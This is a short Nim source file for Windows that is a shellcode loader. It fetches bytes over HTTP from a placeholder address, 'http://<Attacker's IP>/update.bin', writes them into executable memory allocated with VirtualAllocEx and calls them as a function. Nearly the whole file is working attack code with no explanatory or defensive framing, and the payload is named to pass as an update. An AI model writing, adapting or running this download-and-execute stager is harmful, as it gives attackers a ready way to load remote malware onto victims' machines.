import winim/lean
import httpclient

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)

  var shellcode: seq[byte] = toByteSeq(response)

  # Safety check
  if shellcode.len == 0:
    return

  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

  defer:
    CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(
    pHandle,
    NULL,
    cast[SIZE_T](shellcode.len),
    0x3000,
    PAGE_EXECUTE_READ_WRITE
  )

  # Check allocation
  if rPtr == NULL:
    return

  copyMem(rPtr, addr shellcode[0], shellcode.len)

  let f = cast[proc() {.nimcall.}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://<Attacker's IP>/update.bin")